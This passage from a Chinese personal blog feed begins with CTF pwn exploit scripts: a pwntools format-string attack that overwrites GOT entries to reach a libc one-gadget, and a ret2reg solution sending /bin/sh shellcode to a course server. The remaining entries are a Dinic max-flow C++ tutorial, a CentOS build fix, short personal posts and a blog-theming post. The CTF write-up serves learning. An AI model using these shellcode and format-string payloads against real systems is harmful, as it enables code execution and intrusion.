class="string">'\0'</span>*(<span class="number">8</span>-len(ret1)))</span><br><span class="line"><span class="keyword">print</span> setvbuf_addr</span><br><span class="line"></span><br><span class="line"><span class="comment">#puts_offset = 0x06f690 #https://libc.blukat.me/?q=puts%3A690&amp;l=libc6_2.23-0ubuntu10_amd64</span></span><br><span class="line"><span class="comment">#gadget_offset = 0x45216</span></span><br><span class="line"><span class="comment">#setvbuf_offset = 0x6fe70</span></span><br><span class="line"></span><br><span class="line">puts_offset = <span class="number">0x071910</span></span><br><span class="line">gadget_offset = <span class="number">0x4484f</span></span><br><span class="line">setvbuf_offset = <span class="number">0x71F90</span></span><br><span class="line"></span><br><span class="line">gadget_addr = setvbuf_addr - setvbuf_offset + gadget_offset</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    payload =<span class="string">''</span></span><br><span class="line">    <span class="keyword">if</span>(ord(p64(gadget_addr)[i])!=<span class="number">0</span>):</span><br><span class="line">        payload =<span class="string">'%'</span>+str(ord(p64(gadget_addr)[i]))+<span class="string">'c'</span></span><br><span class="line">    payload +=<span class="string">'%9$hhn'</span></span><br><span class="line">    payload +=<span class="string">'A'</span>*(<span class="number">24</span>-len(payload))</span><br><span class="line">    payload += p64(ext_got+i)</span><br><span class="line">    print(payload)</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">payload =<span class="string">'%999999c%999999c%999999c%999999c%196084c'</span></span><br><span class="line">payload +=<span class="string">'%13$lln'</span></span><br><span class="line">payload +=<span class="string">'A'</span>*(<span class="number">7</span>*<span class="number">8</span>-len(payload))</span><br><span class="line">payload += p64(printf_got)</span><br><span class="line">print(payload)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##################################################################</span></span><br></pre></td></tr></table></figure>
<hr>
<h5 id="fsb-easy-v2"><a class="header-anchor" href="#fsb-easy-v2">¶</a>fsb easy</h5>
<p>这题忘了当时怎么做的了<br>
大概是ret2reg<br>
反正没卡我多久，fsb inf 卡得久。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#0x0000000000400605 : jmp rsp</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">auth=<span class="string">'3180103367.4124bb15c1dad3091d08fdab64d5c43d'</span></span><br><span class="line">sh=remote(<span class="string">"10.214.10.18"</span>,<span class="number">10085</span>)</span><br><span class="line">sh.recvrepeat(timeout = <span class="number">1</span>)</span><br><span class="line">sh.sendline(auth)</span><br><span class="line"><span class="comment">#sh=process('./warmup')</span></span><br><span class="line">sh.recvrepeat(timeout = <span class="number">1</span>)</span><br><span class="line">jmp_rsp=<span class="number">0x00400605</span></span><br><span class="line">shellcode=<span class="string">'\x50\x48\x31\xD2\x48\x31\xF6\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x53\x54\x5F\xB0\x3B\x0F\x05'</span></span><br><span class="line">payload = flat([shellcode,<span class="string">'A'</span> * (<span class="number">0x8</span>+<span class="number">0x50</span>-len(shellcode)), jmp_rsp,<span class="number">0x0</span>])</span><br><span class="line">payload = payload+<span class="string">'\x48\x83\xEC\x60\xFF\xE4'</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvrepeat(timeout = <span class="number">1</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<hr>
]]></content>
    <summary type="html">
    <![CDATA[<p>代码之后会放在 <a href="https://github.com/XTXTMTXTX/ACTF-2019" target="_blank" rel="external">https://github.com/XTXTMTXTX/ACTF-2019</a><br>
一度]]>
    </summary>
    
      <category term="C++" scheme="https://www.xtxtmtxtx.xyz/tags/C/"/>
    
      <category term="CTF" scheme="https://www.xtxtmtxtx.xyz/tags/CTF/"/>
    
      <category term="Linux" scheme="https://www.xtxtmtxtx.xyz/tags/Linux/"/>
    
      <category term="Reverse" scheme="https://www.xtxtmtxtx.xyz/tags/Reverse/"/>
    
      <category term="Tech" scheme="https://www.xtxtmtxtx.xyz/categories/Tech/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Why do you have to keep learning?]]></title>
    <link href="https://www.xtxtmtxtx.xyz/articles/learning/"/>
    <id>https://www.xtxtmtxtx.xyz/articles/learning/</id>
    <published>2019-03-10T14:55:02.000Z</published>
    <updated>2019-03-10T15:00:49.917Z</updated>
    <content type="html"><![CDATA[<h2 id="life-is-like-riding-a-bicycle-to-keep-your-balance-you-must-keep-moving"><a class="header-anchor" href="#life-is-like-riding-a-bicycle-to-keep-your-balance-you-must-keep-moving">¶</a>  Life is like riding a bicycle. To keep your balance you must keep moving.</h2>
<h2 id="vision-without-execution-is-just-hallucination"><a class="header-anchor" href="#vision-without-execution-is-just-hallucination">¶</a>  Vision without execution is just hallucination.</h2>
<h2 id="you-learn-something-every-day-if-you-pay-attention"><a class="header-anchor" href="#you-learn-something-every-day-if-you-pay-attention">¶</a>  You learn something every day if you pay attention.</h2>
<h2 id="the-past-can-hurt-but-the-way-i-see-it-you-can-either-run-from-it-or-learn-from-it"><a class="header-anchor" href="#the-past-can-hurt-but-the-way-i-see-it-you-can-either-run-from-it-or-learn-from-it">¶</a>  The past can hurt. But the way I see it, you can either run from it, or learn from it.</h2>
<p><br><br><br><br>
  十一点半断电。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="life-is-like-riding-a-bicycle-to-keep-your-balance-you-must-keep-moving"><a class="header-anchor" href="#life-is-like-riding-a-bicyc]]>
    </summary>
    
      <category term="杂" scheme="https://www.xtxtmtxtx.xyz/tags/%E6%9D%82/"/>
    
      <category term="Others" scheme="https://www.xtxtmtxtx.xyz/categories/Others/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[网络流]]></title>
    <link href="https://www.xtxtmtxtx.xyz/articles/NetWork-Flow/"/>
    <id>https://www.xtxtmtxtx.xyz/articles/NetWork-Flow/</id>
    <published>2019-03-06T07:00:31.000Z</published>
    <updated>2019-03-08T02:12:14.994Z</updated>
    <content type="html"><![CDATA[<p>  一直以来都觉得网络流特别的高深莫测，所以就没有怎么用心看过。结果在学校校队选拔赛碰上了道网络流套路题，当场就跳过了。事后想想不行，不管怎么样的算法总得先去学才能会，于是看了几篇博客，姑且是按着博客里的介绍自己一行行打出来了。当然了，这里并不做什么再次讲解，纯粹丢个有注释的代码就跑了（方便以后忘了回来看眼）。对于网络流具体应该怎么理解，可以看这篇博客：<a href="https://blog.csdn.net/lzoi_hmh/article/details/74940366" target="_blank" rel="external">https://blog.csdn.net/lzoi_hmh/article/details/74940366</a><br>
　　首先，这是我按照网络流想法直接实现的一个非常朴素、低效的代码，见下：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> MAXN <span class="number">205</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> MAXM <span class="number">205</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> min(x,y) ((x)&lt;(y)?(x):(y))</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">read</span><span class="params">()</span></span>&#123;<span class="comment">//读写优化 </span></span><br><span class="line">	<span class="keyword">int</span> x=<span class="number">0</span>,f=<span class="number">1</span>;<span class="keyword">char</span> ch=getchar();</span><br><span class="line">	<span class="keyword">while</span>(ch&lt;<span class="string">'0'</span>||ch&gt;<span class="string">'9'</span>)&#123;<span class="keyword">if</span>(ch==<span class="string">'-'</span>)f=-<span class="number">1</span>;ch=getchar();&#125;</span><br><span class="line">	<span class="keyword">while</span>(ch&gt;=<span class="string">'0'</span>&amp;&amp;ch&lt;=<span class="string">'9'</span>)&#123;x=x*<span class="number">10</span>+ch-<span class="string">'0'</span>;ch=getchar();&#125;</span><br><span class="line">	<span class="keyword">return</span> x*f;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> lines=<span class="number">0</span>,First[MAXN],Next[MAXM*<span class="number">2</span>],w[MAXM*<span class="number">2</span>],v[MAXM*<span class="number">2</span>];</span><br><span class="line"><span class="keyword">bool</span> visited[MAXN];</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">addline</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> z)</span></span>&#123;<span class="comment">//链式前向星加边 </span></span><br><span class="line">	Next[lines]=First[x];</span><br><span class="line">	First[x]=lines;</span><br><span class="line">	v[lines]=y;</span><br><span class="line">	w[lines]=z;</span><br><span class="line">	lines++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> n,m,stuck[MAXN],stop=<span class="number">0</span>,ans=<span class="number">0</span>;<span class="comment">//stuck存放增广路上经过的边 </span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(x==n)&#123;</span><br><span class="line">		<span class="keyword">int</span> d=w[stuck[<span class="number">0</span>]];</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;stop;i++)d=min(d,w[stuck[i]]);<span class="comment">//遍历增广路上的边找出最大能通过的流量 </span></span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;stop;i++)&#123;</span><br><span class="line">			w[stuck[i]]-=d;<span class="comment">//遍历增广路上的边并减去相应流量 </span></span><br><span class="line">			w[stuck[i]^<span class="number">1</span>]+=d;<span class="comment">//遍历增广路上的边并为其反向边加上相应流量</span></span><br><span class="line">		&#125;</span><br><span class="line">		ans+=d;</span><br><span class="line">		stop=<span class="number">0</span>;</span><br><span class="line">		<span class="built_in">memset</span>(visited,<span class="number">0</span>,<span class="keyword">sizeof</span>(visited));<span class="comment">//清理数组，准备下一次增广 </span></span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=First[x];i!=-<span class="number">1</span>;i=Next[i])&#123;<span class="comment">//遍历该点引出的边 </span></span><br><span class="line">		<span class="keyword">if</span>(!w[i]||visited[v[i]])<span class="keyword">continue</span>;<span class="comment">//当前边无剩余流量，跳过 </span></span><br><span class="line">		stuck[stop++]=i;<span class="comment">//将该边压栈 </span></span><br><span class="line">		visited[v[i]]=<span class="number">1</span>;<span class="comment">//防止走回路 </span></span><br><span class="line">		<span class="keyword">if</span>(dfs(v[i]))<span class="keyword">return</span> <span class="number">1</span>;<span class="comment">//如果下一层dfs找到增广路，直接返回true </span></span><br><span class="line">		visited[v[i]]=<span class="number">0</span>;<span class="comment">//回溯 </span></span><br><span class="line">		stop--;<span class="comment">//出栈 </span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//未找到增广路，返回false </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	m=read(),n=read();</span><br><span class="line">	<span class="built_in">memset</span>(First,-<span class="number">1</span>,<span class="keyword">sizeof</span>(First));<span class="comment">//初始化 </span></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;m;i++)&#123;</span><br><span class="line">		<span class="keyword">int</span> x=read(),y=read(),z=read();</span><br><span class="line">		addline(x,y,z);<span class="comment">//添加当前边 </span></span><br><span class="line">		addline(y,x,<span class="number">0</span>);<span class="comment">//添加反向边</span></span><br><span class="line">		<span class="comment">//一条边的反向边编号即为该边编号^1，e.g.，123号边反向边为123^1==122</span></span><br><span class="line">	&#125;</span><br><span class="line">	visited[<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">while</span>(dfs(<span class="number">1</span>));<span class="comment">//不断重复dfs直到无法增广 </span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,ans);<span class="comment">//输出答案 </span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>  每次 dfs 都只增广一条增广路，找到汇点就直接退出，提交到 <a href="http://codevs.cn/problem/1993/" target="_blank" rel="external">Codevs 1993</a> 上，不出意外地 TLE 了。<br>
　　对其稍加改进，增加分层、一次增广多条路径，也就是 dinic 算法，于是写成了这样：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> MAXN <span class="number">205</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> MAXM <span class="number">205</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> min(x,y) ((x)&lt;(y)?(x):(y))</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">read</span><span class="params">()</span></span>&#123;<span class="comment">//读写优化 </span></span><br><span class="line">	<span class="keyword">int</span> x=<span class="number">0</span>,f=<span class="number">1</span>;<span class="keyword">char</span> ch=getchar();</span><br><span class="line">	<span class="keyword">while</span>(ch&lt;<span class="string">'0'</span>||ch&gt;<span class="string">'9'</span>)&#123;<span class="keyword">if</span>(ch==<span class="string">'-'</span>)f=-<span class="number">1</span>;ch=getchar();&#125;</span><br><span class="line">	<span class="keyword">while</span>(ch&gt;=<span class="string">'0'</span>&amp;&amp;ch&lt;=<span class="string">'9'</span>)&#123;x=x*<span class="number">10</span>+ch-<span class="string">'0'</span>;ch=getchar();&#125;</span><br><span class="line">	<span class="keyword">return</span> x*f;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> lines=<span class="number">0</span>,First[MAXN],Next[MAXM*<span class="number">2</span>],w[MAXM*<span class="number">2</span>],v[MAXM*<span class="number">2</span>],dis[MAXN];</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">addline</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> z)</span></span>&#123;<span class="comment">//链式前向星加边 </span></span><br><span class="line">	Next[lines]=First[x];</span><br><span class="line">	First[x]=lines;</span><br><span class="line">	v[lines]=y;</span><br><span class="line">	w[lines]=z;</span><br><span class="line">	lines++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> n,m,ans=<span class="number">0</span>,st,ed;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">bool</span> <span class="title">bfs</span><span class="params">()</span></span>&#123;<span class="comment">//DINIC分层，即BFS搜索每个点到源点最短距离</span></span><br><span class="line">	<span class="keyword">static</span> <span class="keyword">int</span> h,t,que[MAXN];</span><br><span class="line">	<span class="keyword">static</span> <span class="keyword">bool</span> b[MAXN];<span class="comment">//判断是否遍历到过 </span></span><br><span class="line">	<span class="built_in">memset</span>(b,<span class="number">0</span>,<span class="keyword">sizeof</span>(b));</span><br><span class="line">	<span class="built_in">memset</span>(dis,-<span class="number">1</span>,<span class="keyword">sizeof</span>(dis));</span><br><span class="line">	h=<span class="number">0</span>,t=<span class="number">1</span>;</span><br><span class="line">	que[h]=st;</span><br><span class="line">	b[st]=<span class="number">1</span>;</span><br><span class="line">	dis[st]=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>(h!=t)&#123;</span><br><span class="line">		<span class="keyword">int</span> x=que[h++];h%=MAXN;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=First[x];i!=-<span class="number">1</span>;i=Next[i])&#123;</span><br><span class="line">			<span class="keyword">if</span>(b[v[i]]||!w[i])<span class="keyword">continue</span>;<span class="comment">//跳过已访问过的点及不流通的点 </span></span><br><span class="line">			dis[v[i]]=dis[x]+<span class="number">1</span>;</span><br><span class="line">			que[t++]=v[i];t%=MAXN;</span><br><span class="line">			b[v[i]]=<span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> b[ed];<span class="comment">//返回汇点能否遍历到 </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> flow)</span></span>&#123;<span class="comment">//x表示当前点，flow表示到该点的流量，源点正无穷设为-1，并返回该点流到汇点的流量 </span></span><br><span class="line">	<span class="keyword">if</span>(x==ed)<span class="keyword">return</span> flow;<span class="comment">//找到汇点，返回流量 </span></span><br><span class="line">	<span class="keyword">int</span> c,d=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=First[x];i!=-<span class="number">1</span>;i=Next[i])&#123;</span><br><span class="line">		<span class="keyword">if</span>(!w[i]||dis[v[i]]!=dis[x]+<span class="number">1</span>)<span class="keyword">continue</span>;<span class="comment">//跳过非下一层的点及不流通的点 </span></span><br><span class="line">		c=dfs(v[i],((flow==-<span class="number">1</span>||w[i]&lt;(flow-d))?w[i]:(flow-d)));<span class="comment">//传入下一层DFS，可用流量为该边剩余流量或该点剩余流量 </span></span><br><span class="line">		d+=c;<span class="comment">//该点流出流量 </span></span><br><span class="line">		w[i]-=c;<span class="comment">//该边减去相应剩余流量 </span></span><br><span class="line">		w[i^<span class="number">1</span>]+=c;<span class="comment">//该边反向边加上相应剩余流量</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> d;<span class="comment">//返回该点最终流出流量</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	n=read();m=read();</span><br><span class="line">	st=read();ed=read();</span><br><span class="line">	<span class="built_in">memset</span>(First,-<span class="number">1</span>,<span class="keyword">sizeof</span>(First));<span class="comment">//初始化 </span></span><br><span class="line">	lines=<span class="number">0</span>;ans=<span class="number">0</span>; </span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;m;i++)&#123;</span><br><span class="line">		<span class="keyword">int</span> x=read(),y=read(),z=read();</span><br><span class="line">		addline(x,y,z);<span class="comment">//添加当前边 </span></span><br><span class="line">		addline(y,x,<span class="number">0</span>);<span class="comment">//添加反向边</span></span><br><span class="line">		<span class="comment">//一条边的反向边编号即为该边编号^1，e.g.，123号边反向边为123^1==122</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span>(bfs())ans+=dfs(st,-<span class="number">1</span>);<span class="comment">//直到源点到汇点无通路，不断增广 </span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,ans);<span class="comment">//输出答案</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>  其实可以发现，大部分讲网络流的文章里都提到了增加反向弧、剩余流量、最大流量的概念。一开始我也是因为这些概念多，下意识认为实现起来特别麻烦就放弃了。其实利用链式前向星的存图方法的话，只要在加单向边的时候增加一条相反的、剩余流量为 0 的边，然后当作普通的边处理就可以了；互相找反向边也很方便，直接异或 1 就可以了。至于最大流量和剩余流量，只要确保正向边和反向边剩余流量都不为负即可，不用管最大流量。另外无向图建图时，给反向边也设置成与正向边相同的剩余流量就可以了。<br>
　　另外最大流与最小割是可以互相转换的，但如果要知道最小割的边数就会显得有点麻烦。其实有一个办法，在 m * sigma ( ci ) 不会爆精度的情况下，可以在加边时让每条边的流量存为 ci * m + 1，最终 ans % m 就是最小割的边数，ans / m 就是答案。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>  一直以来都觉得网络流特别的高深莫测，所以就没有怎么用心看过。结果在学校校队选拔赛碰上了道网络流套路题，当场就跳过了。事后想想不行，不管怎么样的算法总得先去学才能会，于是看了几篇博客，姑且是按着博客里的介绍自己一行行打出来了。当然了，这里并不做什么再次讲解，纯粹丢个有注释]]>
    </summary>
    
      <category term="Algorithm" scheme="https://www.xtxtmtxtx.xyz/tags/Algorithm/"/>
    
      <category term="C++" scheme="https://www.xtxtmtxtx.xyz/tags/C/"/>
    
      <category term="OI" scheme="https://www.xtxtmtxtx.xyz/tags/OI/"/>
    
      <category term="OI" scheme="https://www.xtxtmtxtx.xyz/categories/OI/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[时间]]></title>
    <link href="https://www.xtxtmtxtx.xyz/articles/nostalgia/"/>
    <id>https://www.xtxtmtxtx.xyz/articles/nostalgia/</id>
    <published>2019-03-06T04:54:58.000Z</published>
    <updated>2019-03-06T05:33:05.561Z</updated>
    <content type="html"><![CDATA[<p id="point" style="text-align:center;color: #555;font-size:50px;word-wrap: break-word;word-break: break-all;overflow: hidden;"></p>
<center>今天是 <span id="SY3"></span> 年 <span id="SM3"></span> 月 <span id="SD3"></span> 日</center>  
<center>距离 2018 年 6 月 8 日</center>  
<center>已过去</center>  
<p id="result1" style="text-align:center;font-size:80px;"></p>

<script type="text/javascript">
    let y2=2018;
    let m2=6;
    let d2=8;
    let day2=new Date(y2,m2-1,d2);
    let day3=new Date();
    document.getElementById("SY3").innerHTML=day3.getFullYear();
    document.getElementById("SM3").innerHTML=day3.getMonth()+1;
    document.getElementById("SD3").innerHTML=day3.getDate();
    for(let i=0;i<parseInt((day3-day2)/86400000);i++)document.getElementById("point").innerHTML=document.getElementById("point").innerHTML+"·";
    document.getElementById("result1").innerHTML=parseInt((day3-day2)/86400000)+" 天";
</script>

]]></content>
    <summary type="html">
    <![CDATA[<p id="point" style="text-align:center;color: #555;font-size:50px;word-wrap: break-word;word-break: break-all;overflow: hidden;"></p>
<cente]]>
    </summary>
    
      <category term="杂" scheme="https://www.xtxtmtxtx.xyz/tags/%E6%9D%82/"/>
    
      <category term="Others" scheme="https://www.xtxtmtxtx.xyz/categories/Others/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Centos7 下 make 找不到 linux/errno.h 等文件的解决办法]]></title>
    <link href="https://www.xtxtmtxtx.xyz/articles/cantfinderrno/"/>
    <id>https://www.xtxtmtxtx.xyz/articles/cantfinderrno/</id>
    <published>2019-02-26T15:51:41.000Z</published>
    <updated>2019-02-27T05:09:32.747Z</updated>
    <content type="html"><![CDATA[<p>先贴解决方案 <code>yum -y install linux-libc-dev</code><br>
　　这个问题是在搭建某 proto 时发现的，那个仓库的 readme 上并没有相应的解决方案，只有 <code>yum install openssl-devel zlib-devel</code> 和 <code>yum groupinstall &quot;Development Tools&quot;</code><br>
　　当然我就报错了，于是百度之，找到了一堆创建文件夹链接，链接某个很长很长路径下的库到 /usr/include 的方法<br>
　　一一试过之后发现各种坑，先把 linux/ 文件夹链接过去发现 asm/errno.h 找不着，把 asm-generic 文件夹链接过去还是找不着，差点就放弃了。<br>
　　最后终于在 CSDN 论坛里一个没有解决题主实际提出的问题的答案下找到了解决方案（笑），本着试一试的心态先把之前链接的文件夹都删了，再 yum 安装之， make clean 再 make 就成了。<br>
　　记下来算是给自己以后换机子的话再撞类似的坑方便一点，挺水的。顺便今天出 cet-4 成绩了。转个题外话：<br>
　　刚刚查了一下，626分。这么多年来的默默付出，终于有了回报，起早贪黑，牵肠挂肚，甚至废寝忘食，换来了如今的成绩。谢谢自己的每一分努力和付出，机会总是给有准备的人的。我始终记得这些刻苦铭心的谆谆教诲，无论我走到哪里，都不会忘记这份恩情，对了我查的是支付宝芝麻信用分，不知道你们是多少。😁</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>先贴解决方案 <code>yum -y install linux-libc-dev</code><br>
　　这个问题是在搭建某 proto 时发现的，那个仓库的 readme 上并没有相应的解决方案，只有 <code>yum install openssl-devel ]]>
    </summary>
    
      <category term="Linux" scheme="https://www.xtxtmtxtx.xyz/tags/Linux/"/>
    
      <category term="make" scheme="https://www.xtxtmtxtx.xyz/tags/make/"/>
    
      <category term="编译错误" scheme="https://www.xtxtmtxtx.xyz/tags/%E7%BC%96%E8%AF%91%E9%94%99%E8%AF%AF/"/>
    
      <category term="Centos" scheme="https://www.xtxtmtxtx.xyz/categories/Centos/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[美化 Blog && 加入评论功能]]></title>
    <link href="https://www.xtxtmtxtx.xyz/articles/embellish/"/>
    <id>https://www.xtxtmtxtx.xyz/articles/embellish/</id>
    <published>2019-01-12T04:47:45.000Z</published>
    <updated>2019-02-27T05:17:12.342Z</updated>
    <content type="html"><![CDATA[<p>快到考试周了，虽然没怎么复习，但依旧忙里偷闲，先是为原先的 VPS 发工单续了个费，再是昨天买了一年10元月付的腾讯云学生主机，初始化又搞了半天。昨天将近凌晨还打了把 CF<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup> ，十分不幸，我居然被 div2 C 题给杀了，完了之后跟同学一讲，原来是读错题了🤔🤔🤔。然后这几天还折腾了几下优化博客的体验，期末考怕是要凉了。<br>
　　好了，言归正传，讲一下怎么给博客加上一些效果，让博客看起来更好看，和加上评论功能。<br>
<br></p>
<h1>添加 js 效果</h1>
<hr>
<p>首先是给博客加上一些小动画，像这里的点击爱心效果和背景的效果，其实引入一个js就可以做到。问题就是怎么引入了。<br>
